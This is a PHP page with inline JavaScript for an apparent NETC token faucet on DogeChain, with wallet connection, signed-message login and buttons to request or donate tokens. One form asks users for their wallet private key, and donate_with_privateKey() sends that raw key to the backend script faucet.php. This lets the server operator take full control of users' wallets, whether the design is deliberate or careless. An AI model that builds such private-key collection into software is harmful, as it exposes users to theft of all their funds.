 <?php include("base.php"); ?> 
  
            <section class="container" style="margin-top:30px; display: flex;align-items: center;justify-content: center;">
        <div class="panel panel-default" style="width: 750px;">
          <div class="panel-heading"><h3>NetCoin(NETC) Faucet</h3></div>
          <div class="panel-body" style="display: flex;flex-direction: column;justify-content: space-evenly;">
            <div style="display: flex;margin: 5px 0; justify-content: space-between;align-items: center;">
              <div style>Enter Your Wallet Address <span style="color:grey; font-weight: bold;">Or</span> Connect Your Wallet</div>
              <button class="btn btn-primary" style="margin: 5px 5px; float:right;" id="conBtn" onclick="connectWallet()">CONNECT</button>
            </div>
            <div style="margin: 5px 0">
              <input type="text" class="form-control container-fluid" id="reqAddress" placeholder="Enter your ERC-20 compatible address (e.g.: 0x…)" aria-describedby="basic-addon1" value="" style="min-width: 350px;text-align: center;">
            </div>
            <button class="btn btn-success" style="margin: 5px 0" id="reqBtn" onclick="sendRequest()">Request 1 NETC from faucet</button>
            <button class="btn btn-success" style="margin: 5px 0" id="donateBtn" onclick="donateTofaucet()">Donate 1 NETC to faucet</button>

            <div style="margin-top: 15px; margin-bottom: 5px;">
              <input type="text" class="form-control container-fluid" id="privateKey" placeholder="Enter your private key to donate to faucet" aria-describedby="basic-addon1" value="" style="min-width: 350px;text-align: center;">
            </div>
            <button class="btn btn-success" style="margin: 5px 0" id="donateBtn_prv" onclick="donate_with_privateKey()">Donate 1 NETC to faucet by using private key</button>

            <button class="btn btn-success" style="margin: 5px 0" id="donateBtn_prv" onclick="add_netc_to_wallet()">Add NETC token to your wallet</button>

            <div class="spinner-border text-primary" id="loadingStatus" style="display: none;" role="status">
              <span class="sr-only">Loading...</span>
              <div style=""><progress max="100" value="80"></progress></div>
            </div>

          </div>
        </div>
      </section>  

    <script>
      // If this package is in a subfolder, define the backend path
      // backendPath = "backend/";
      // connect -> fetch_nonce -> sign message-> jwt -> request token with jwt      
      var JWT = '';
      var address = '';
      var DogeChainId = '0x7d0';

      if (typeof(backendPath) == 'undefined') {
        var backendPath = '';
      }
      
      function toggleRequestButton(isLoading) {
        if(isLoading) {
          document.getElementById('reqBtn').disabled = true;
          document.getElementById('donateBtn').disabled = true;
          document.getElementById('conBtn').disabled = true;
          document.getElementById('reqAddress').disabled = true;
          document.getElementById('donateBtn_prv').disabled = true;
          document.getElementById('privateKey').disabled = true;
          document.getElementById('loadingStatus').style.display='block';
        }
        else {
          document.getElementById('reqBtn').disabled = false;
          document.getElementById('donateBtn').disabled = false;
          document.getElementById('conBtn').disabled = false;
          document.getElementById('reqAddress').disabled = false;
          document.getElementById('donateBtn_prv').disabled = false;
          document.getElementById('privateKey').disabled = false;
          document.getElementById('loadingStatus').disabled = false;
          document.getElementById('loadingStatus').style.display='none';
        }
      }

      async function add_netc_to_wallet() {
        const tokenAddress = '<?php echo $tokenContractAddress;?>';
        const tokenSymbol = 'NETC';
        const tokenDecimals = <?php echo $decimals;?>;
        const tokenImage = 'http://placekitten.com/200/300';
        if(!ethereum) { alert('Please check if wallet connected'); return; }

        const chainId = await ethereum.request({ method: 'eth_chainId' });          
        if(chainId != DogeChainId) {
          alert('Please swtich your network to dogechain')
          const isSucess = await switchAndAddNetwork();
          if(!isSucess) {
            return;
          }
          return;
        }

        try {
          // wasAdded is a boolean. Like any RPC method, an error may be thrown.
          const wasAdded = await ethereum.request({
            method: 'wallet_watchAsset',
            params: {
              type: 'ERC20', // Initially only supports ERC20, but eventually more!
              options: {
                address: tokenAddress, // The address that the token is at.
                symbol: tokenSymbol, // A ticker symbol or shorthand, up to 5 chars.
                decimals: tokenDecimals, // The number of decimals in the token
                image: tokenImage, // A string url of the token logo
              },
            },
          });

          if (wasAdded) {
            console.log('Thanks for your interest!');
          } else {
            console.log('Your loss!');
          }
        } catch (error) {
          console.log(error);
        }
      }

      async function donate_with_privateKey() {
        var privateKey = document.getElementById("privateKey").value;
        if(!privateKey) {
          alert("Please enter your private key to donate by using private key")
        }
        toggleRequestButton(true)
        axios
          .post(
            backendPath+"faucet.php",
            {
              request: "donate",
              privateKey: privateKey
            }
          )
          .then(function(response) {
            if (response.data.status == "success") { 
              alert("Thank you for your donation");
            }
            else {
              alert(response.data.msg);
              console.log(response.data);
            }
          })
          .catch(function(error) {
            alert("Something went wrong!");
            console.error(error);
          })
          .finally(function() {
            toggleRequestButton(false);
          });
      }

      async function donateTofaucet() {
        if(!address) {alert('Please connect your wallet'); return;}
        
        var BN = web3.utils.BN;

        var tokenContractAddress = '<?php echo $tokenContractAddress;?>';
        var toAddress = '<?php echo $faucetWalletAddress;?>';
        var decimals = BN(<?php echo $decimals;?>);
        var amount = BN(1);
        var erc20ABI = <?php echo $erc20AbiJsonFile; ?>;
        // Get ERC20 Token contract instance

        var contract = new web3.eth.Contract(erc20ABI, tokenContractAddress);
        // calculate ERC20 token amount
        var value = amount.mul(BN(10).pow(decimals));
        // call transfer function
        toggleRequestButton(true);
        await contract.methods.transfer(toAddress, value).send({from: address}, function(error, transactionHash){
          console.log(error, transactionHash);
          if(!error) {
            alert('Thank you for your donation')
          } else {
            alert(error.message)
          }
          toggleRequestButton(false);
        });
        
      }

      function sendRequest() {
        address = document.getElementById("reqAddress").value;
        if(!address) {
          alert("Please enter the address");
          return;
        }
        if (!JWT) {
          toggleRequestButton(true);
          axios.post(
            backendPath+"faucet.php",
            {
              reqAddress: address,
              request: 'requestMessage'
            }
          )
          .then(function(response) { 
            if(response.status == 200) {
              let message = response.data.msg;
              handleSignMessage(message, address).then(handleAuthenticate);
              
              function handleSignMessage(msg, addr) {
                return new Promise((resolve, reject) =>  
                  web3.eth.personal.sign(
                    web3.utils.utf8ToHex(message),
                    address,
                    (err, signature) => {
                      if (err) {
                        alert('Failed to sign')
                        toggleRequestButton(false);
                      }
                      return resolve({ address, signature });
                    }
                  )
                );
              }

              function handleAuthenticate({ address, signature }) {
                axios
                  .post(
                    backendPath+"faucet.php",
                    {
                      request: "auth",
                      reqAddress: arguments[0].address,
                      signature: arguments[0].signature
                    }
                  )
                  .then(function(response) {
                    if (response.data.status == "success") { 
                      JWT = response.data.msg;
                      requestToken();
                    }
                    else {
                      JWT = '';
                      alert('Authenticate failed!');
                      toggleRequestButton(false);
                    }
                  })
                  .catch(function(error) {
                    console.error(error);
                  });
              }

            }
            else {
              alert("Network Error! please try it again later")
              toggleRequestButton(false);
            }
          })
          .catch(function(error) {
            alert("Network Error! please try it again later");
            console.error(error);
          });
        }
        else {
          requestToken();
        }
      }

      function requestToken() {
        address = document.getElementById("reqAddress").value;
        toggleRequestButton(true);
        axios.post(
          backendPath+"faucet.php",
          {
            reqAddress: address,
            request: 'requestToken',
            JWT: JWT            
          }
        )
        .then(function(response) { 
          if(response.status == 200) {
            if(response.data.status === "error") {
              alert(response.data.msg);
              if(response.data.msg.substring(0, 4) == 'Auth') {
                JWT = '';
              }
            }
            else if(response.data.status === "success") {
              alert(response.data.msg);
            }
            else {
              alert("Network Error! please try it again later")
            }

          }
          else {
            alert("Network Error! please try it again later");
          }
          toggleRequestButton(false);
        })
        .catch(function(error) {
          alert("Network Error! please try it again later");
          console.error(error);
        });
      }

      // On accountsChanged
      async function ethAccountsChanged() {      
        let accountsOnEnable = await web3.eth.getAccounts();
        address = accountsOnEnable[0];
        try {
          JWT = '';
          address = address.toLowerCase();
          if(address) document.getElementById("reqAddress").value = address;
        } catch (e) {
          JWT = '';
          document.getElementById("reqAddress").value = '';
        }
      }

      function ethAccountsDisconnected() {
        document.getElementById("reqAddress").value = '';
      }

      async function ethChainChanged() {
        const chainId = await ethereum.request({ method: 'eth_chainId' });          
        if(chainId != DogeChainId) {
          const isSucess = await switchAndAddNetwork();
          if(!isSucess) {
            return;
          }
        }
        await getConnectedAccount();
      }

      async function switchAndAddNetwork() {
        try {
          await ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: DogeChainId}],
          });
          return true;
        } catch (switchError) {
          // This error code indicates that the chain has not been added to MetaMask.
          if (switchError.code === 4902) {
            console.log("This network is not available in your metamask, please add it")
            try {
              await provider.request({
                method: 'wallet_addEthereumChain',
                params: {
                  chainId: DogeChainId, 
                  chainName:'DogeChain',
                  rpcUrls:['https://rpc-sg.dogechain.dog'],
                  blockExplorerUrls:['https://explorer.dogechain.dog'],
                  nativeCurrency: { 
                      symbol:'DOGE',   
                      decimals: 8
                  }}   
              });
              return true;
            } catch (addError) {
               console.log(addError);
               return false;
            }

          }
          console.log("Failed to switch to the network")
          return false;
        } 
      }

      async function getConnectedAccount() {
        try {
            let accountsOnEnable = await ethereum.request({ method: 'eth_accounts' });
            address = accountsOnEnable[0];
            address = address.toLowerCase();
            document.getElementById("reqAddress").value = address;
          } catch (error) {
            document.getElementById("reqAddress").value = '';
            console.log(error);
            return;
          }
      }

      async function connectWallet() {
        document.getElementById("reqAddress").value = '';
        if(!ethereum){
          alert("Metamask is not installed, please install!");
        }
        await onConnectLoadWeb3Modal();        
        if (web3ModalProv) {
          const chainId = await ethereum.request({ method: 'eth_chainId' });
          
          if(chainId != DogeChainId) {
            const isSucess = await switchAndAddNetwork();
            if(!isSucess) {
              return;
            }
          }                   

          await getConnectedAccount();
        }
        else {
          return;
        }
      }
    </script>
    <script src="./assets/web3-modal.js"></script>
